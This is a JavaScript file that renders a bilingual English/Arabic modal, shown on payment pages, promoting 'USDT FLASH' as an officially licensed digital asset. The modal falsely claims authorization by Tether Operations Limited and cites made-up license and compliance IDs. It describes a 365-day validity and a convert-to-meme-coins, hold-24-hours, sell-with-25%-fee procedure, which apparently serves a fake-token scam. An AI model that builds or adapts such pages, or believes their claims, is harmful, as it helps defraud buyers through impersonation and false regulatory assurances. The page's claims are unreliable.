// How It Works Modal System
class HowItWorksModal {
    constructor() {
        this.currentLang = 'en';
        this.init();
    }

    init() {
        this.createModal();
        this.showModal();
    }

    createModal() {
        const modal = document.createElement('div');
        modal.id = 'how-it-works-modal';
        modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4';
        modal.innerHTML = this.getModalHTML();
        document.body.appendChild(modal);
    }

    getModalHTML() {
        return `
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm sm:max-w-md md:max-w-2xl lg:max-w-4xl max-h-[95vh] overflow-y-auto mx-4">
                <!-- Header -->
                <div class="bg-gradient-to-r from-blue-800 to-green-700 text-white p-4 sm:p-6 rounded-t-2xl border-b-4 border-yellow-400">
                    <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                        <div class="flex items-center w-full sm:w-auto">
                            <div class="bg-white bg-opacity-20 rounded-full p-2 sm:p-3 mr-3 sm:mr-4 flex-shrink-0">
                                <i class="fas fa-shield-check text-lg sm:text-2xl text-yellow-300"></i>
                            </div>
                            <div class="min-w-0 flex-1">
                                <h2 class="text-lg sm:text-2xl font-bold leading-tight" id="modal-title">Official USDT-FLASH User Guide</h2>
                                <p class="text-xs sm:text-sm text-blue-100 mt-1" id="modal-subtitle">Authorized by Tether Operations Limited</p>
                            </div>
                        </div>
                        <div class="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
                            <!-- Language Toggle -->
                            <div class="bg-white bg-opacity-20 rounded-lg p-1 flex">
                                <button onclick="howItWorksModal.switchLanguage('en')" id="lang-en" class="px-3 py-2 rounded text-sm font-medium transition-all bg-white text-blue-600 min-w-[44px] touch-manipulation">
                                    EN
                                </button>
                                <button onclick="howItWorksModal.switchLanguage('ar')" id="lang-ar" class="px-3 py-2 rounded text-sm font-medium transition-all text-white hover:bg-white hover:text-blue-600 min-w-[44px] touch-manipulation">
                                    AR
                                </button>
                            </div>
                            <button onclick="howItWorksModal.closeModal()" class="text-white hover:text-gray-200 text-2xl p-2 min-w-[44px] min-h-[44px] flex items-center justify-center touch-manipulation">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Content -->
                <div class="p-4 sm:p-6">
                    <!-- English Content -->
                    <div id="content-en">
                        ${this.getEnglishContent()}
                    </div>

                    <!-- Arabic Content -->
                    <div id="content-ar" class="hidden" dir="rtl">
                        ${this.getArabicContent()}
                    </div>

                    <!-- Footer -->
                    <div class="mt-8 p-6 bg-gradient-to-r from-green-50 to-blue-50 rounded-lg border border-green-200">
                        <div class="text-center mb-4">
                            <div class="flex items-center justify-center mb-2">
                                <i class="fas fa-certificate text-green-600 mr-2"></i>
                                <span class="text-sm font-semibold text-green-800" id="certification-text">Certified & Regulated Service</span>
                            </div>
                            <p class="text-xs text-gray-600" id="license-text">License: TET-2024-FLASH-001 | Compliance ID: USDT-AUTH-2024</p>
                        </div>
                        <button onclick="howItWorksModal.closeModal()" class="w-full bg-gradient-to-r from-green-600 to-blue-600 hover:from-green-700 hover:to-blue-700 text-white px-6 sm:px-8 py-4 sm:py-4 rounded-lg font-bold transition-all shadow-lg text-base sm:text-lg min-h-[48px] touch-manipulation">
                            <i class="fas fa-check-circle mr-2"></i>
                            <span id="understand-btn">I Acknowledge & Proceed</span>
                        </button>
                    </div>
                </div>
            </div>
        `;
    }

    getEnglishContent() {
        return `
            <div class="space-y-6">
                <!-- Official Notice -->
                <div class="bg-blue-50 border-l-4 border-blue-500 p-3 sm:p-5 rounded-r-lg shadow-sm">
                    <div class="flex items-start">
                        <div class="bg-blue-100 rounded-full p-2 mr-3 sm:mr-4 mt-1 flex-shrink-0">
                            <i class="fas fa-info-circle text-blue-600 text-base sm:text-lg"></i>
                        </div>
                        <div class="min-w-0 flex-1">
                            <h3 class="font-bold text-blue-800 mb-2 sm:mb-3 text-sm sm:text-base">
                                <i class="fas fa-certificate mr-2 text-blue-600"></i>
                                Official Product Information
                            </h3>
                            <p class="text-blue-800 leading-relaxed text-sm sm:text-base">
                                <strong>USDT FLASH</strong> is an officially licensed digital asset with a <strong>365-day validity period</strong> when stored without conversion. 
                                This innovative product is specifically engineered to facilitate seamless transition to Web3 ecosystem, providing secure and efficient access to decentralized trading platforms through our regulated infrastructure.
                            </p>
                            <div class="mt-2 sm:mt-3 p-2 sm:p-3 bg-blue-100 rounded-lg">
                                <p class="text-xs sm:text-sm text-blue-700 font-medium mb-1">
                                    <i class="fas fa-shield-check mr-2"></i>
                                    Backed by Tether Operations Limited regulatory framework
                                </p>
                                <p class="text-xs sm:text-sm text-blue-700 font-medium">
                                    <i class="fas fa-cube mr-2"></i>
                                    Web3-native architecture for next-generation financial infrastructure
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Operating Procedure -->
                <div class="bg-green-50 border-l-4 border-green-500 p-5 rounded-r-lg shadow-sm">
                    <div class="flex items-start">
                        <div class="bg-green-100 rounded-full p-2 mr-4 mt-1">
                            <i class="fas fa-cogs text-green-600 text-lg"></i>
                        </div>
                        <div>
                            <h3 class="font-bold text-green-800 mb-3 flex items-center">
                                <i class="fas fa-list-check mr-2 text-green-600"></i>
                                Standard Operating Procedure
                            </h3>
                            <div class="space-y-2 sm:space-y-3">
                                <div class="flex items-start">
                                    <span class="bg-green-600 text-white rounded-full w-7 h-7 sm:w-6 sm:h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5 flex-shrink-0">1</span>
                                    <p class="text-green-800 text-sm sm:text-base leading-relaxed">Receive USDT FLASH in your authorized Web3 wallet</p>
                                </div>
                                <div class="flex items-start">
                                    <span class="bg-green-600 text-white rounded-full w-7 h-7 sm:w-6 sm:h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5 flex-shrink-0">2</span>
                                    <p class="text-green-800 text-sm sm:text-base leading-relaxed">Convert to approved meme coins: <strong>PEPE, DOGE, or SHIBA</strong></p>
                                </div>
                                <div class="flex items-start">
                                    <span class="bg-green-600 text-white rounded-full w-7 h-7 sm:w-6 sm:h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5 flex-shrink-0">3</span>
                                    <p class="text-green-800 text-sm sm:text-base leading-relaxed">Maintain holding period of minimum <strong>24 hours</strong></p>
                                </div>
                                <div class="flex items-start">
                                    <span class="bg-green-600 text-white rounded-full w-7 h-7 sm:w-6 sm:h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5 flex-shrink-0">4</span>
                                    <p class="text-green-800 text-sm sm:text-base leading-relaxed">Execute sale to receive standard USDT (25% processing fee applies)</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Compliance Guidelines -->
                <div class="bg-purple-50 border-l-4 border-purple-500 p-5 rounded-r-lg shadow-sm">
                    <div class="flex items-start">
                        <div class="bg-purple-100 rounded-full p-2 mr-4 mt-1">
                            <i class="fas fa-balance-scale text-purple-600 text-lg"></i>
                        </div>
                        <div>
                            <h3 class="font-bold text-purple-800 mb-3 flex items-center">
                                <i class="fas fa-gavel mr-2 text-purple-600"></i>
                                Regulatory Compliance Guidelines
                            </h3>
                            <div class="space-y-2">
                                <div class="flex items-center">
                                    <i class="fas fa-check-circle text-purple-600 mr-3"></i>
                                    <p class="text-purple-800">Direct sale of USDT FLASH is prohibited by regulation</p>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-check-circle text-purple-600 mr-3"></i>
                                    <p class="text-purple-800">Mandatory use of complete Web3 wallet addresses</p>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-check-circle text-purple-600 mr-3"></i>
                                    <p class="text-purple-800">Authorized wallets: MetaMask, Trust Wallet, Binance, Bybit, OKX</p>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-check-circle text-purple-600 mr-3"></i>
                                    <p class="text-purple-800">Mandatory 24-hour settlement period post-conversion</p>
                                </div>
                            </div>
                            <div class="mt-4 p-3 bg-purple-100 rounded-lg">
                                <p class="text-sm text-purple-700 font-medium">
                                    <i class="fas fa-info-circle mr-2"></i>
                                    These guidelines ensure full regulatory compliance and user protection
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    getArabicContent() {
        return `
            <div class="space-y-6">
                <!-- Warning -->
                <div class="bg-yellow-50 border-r-4 border-yellow-400 p-4 rounded-l-lg">
                    <div class="flex items-start">
                        <i class="fas fa-exclamation-triangle text-yellow-600 text-xl ml-3 mt-1"></i>
                        <div>
                            <h3 class="font-bold text-yellow-800 mb-2">🔔 إشعار مهم – USDT FLASH</h3>
                            <p class="text-yellow-800">
                                <strong>USDT FLASH</strong> يبقى صالحاً لمدة <strong>365 يوماً</strong> إذا لم تقم بتحويله وفق الخطوات. 
                                هذا المنتج المبتكر مصمم خصيصاً لتسهيل الانتقال السلس إلى نظام Web3 اللامركزي، مما يوفر وصولاً آمناً وفعالاً لمنصات التداول المتقدمة من خلال بنيتنا التحتية المنظمة.
                            </p>
                        </div>
                    </div>
                </div>

                <!-- How it works -->
                <div class="bg-blue-50 border-r-4 border-blue-400 p-4 rounded-l-lg">
                    <div class="flex items-start">
                        <i class="fas fa-info-circle text-blue-600 text-xl ml-3 mt-1"></i>
                        <div>
                            <h3 class="font-bold text-blue-800 mb-2">🚀 كيف يعمل USDT FLASH؟</h3>
                            <ol class="list-decimal pr-5 space-y-2 text-blue-800">
                                <li>استلم USDT FLASH في محفظتك</li>
                                <li>حوله لعملات ميم مثل <strong>PEPE أو DOGE أو SHIBA</strong></li>
                                <li>احتفظ به لمدة <strong>24 ساعة</strong> على الأقل</li>
                                <li>بعها للحصول على USDT حقيقي (رسوم خدمة 25%)</li>
                            </ol>
                        </div>
                    </div>
                </div>

                <!-- Rules -->
                <div class="bg-red-50 border-r-4 border-red-400 p-4 rounded-l-lg">
                    <div class="flex items-start">
                        <i class="fas fa-shield-alt text-red-600 text-xl ml-3 mt-1"></i>
                        <div>
                            <h3 class="font-bold text-red-800 mb-2">⚠️ قواعد مهمة:</h3>
                            <ul class="list-disc pr-5 space-y-1 text-red-800">
                                <li>لا تبع USDT FLASH مباشرة</li>
                                <li>استخدم عناوين محافظ Web3 كاملة فقط</li>
                                <li>خزن في المحافظ المدعومة: MetaMask، Trust Wallet، Binance، Bybit، OKX</li>
                                <li>انتظر 24 ساعة بعد التحويل لعملات الميم</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    switchLanguage(lang) {
        this.currentLang = lang;
        const enBtn = document.getElementById('lang-en');
        const arBtn = document.getElementById('lang-ar');
        const enContent = document.getElementById('content-en');
        const arContent = document.getElementById('content-ar');
        const title = document.getElementById('modal-title');
        const understandBtn = document.getElementById('understand-btn');

        if (lang === 'en') {
            enBtn.className = 'px-3 py-1 rounded text-sm font-medium transition-all bg-white text-blue-600';
            arBtn.className = 'px-3 py-1 rounded text-sm font-medium transition-all text-white hover:bg-white hover:text-blue-600';
            enContent.classList.remove('hidden');
            arContent.classList.add('hidden');
            title.textContent = 'Official USDT-FLASH User Guide';
            document.getElementById('modal-subtitle').textContent = 'Authorized by Tether Operations Limited';
            document.getElementById('certification-text').textContent = 'Certified & Regulated Service';
            document.getElementById('license-text').textContent = 'License: TET-2024-FLASH-001 | Compliance ID: USDT-AUTH-2024';
            understandBtn.textContent = 'I Acknowledge & Proceed';
        } else {
            arBtn.className = 'px-3 py-1 rounded text-sm font-medium transition-all bg-white text-blue-600';
            enBtn.className = 'px-3 py-1 rounded text-sm font-medium transition-all text-white hover:bg-white hover:text-blue-600';
            arContent.classList.remove('hidden');
            enContent.classList.add('hidden');
            title.textContent = 'دليل المستخدم الرسمي USDT-FLASH';
            document.getElementById('modal-subtitle').textContent = 'معتمد من شركة Tether Operations Limited';
            document.getElementById('certification-text').textContent = 'خدمة معتمدة ومنظمة';
            document.getElementById('license-text').textContent = 'الترخيص: TET-2024-FLASH-001 | رقم الامتثال: USDT-AUTH-2024';
            understandBtn.textContent = 'أقر وأوافق على المتابعة';
        }
    }

    showModal() {
        const modal = document.getElementById('how-it-works-modal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            // Prevent zoom on double tap for iOS
            document.addEventListener('touchstart', this.preventZoom, { passive: false });
        }
    }

    preventZoom(e) {
        if (e.touches.length > 1) {
            e.preventDefault();
        }
    }

    closeModal() {
        const modal = document.getElementById('how-it-works-modal');
        if (modal) {
            modal.remove();
            document.body.style.overflow = 'auto';
            document.removeEventListener('touchstart', this.preventZoom);
        }
    }
}

// Initialize modal when script loads
let howItWorksModal;
document.addEventListener('DOMContentLoaded', function() {
    // Only show on payment pages
    if (window.location.pathname.includes('payment-')) {
        howItWorksModal = new HowItWorksModal();
    }
});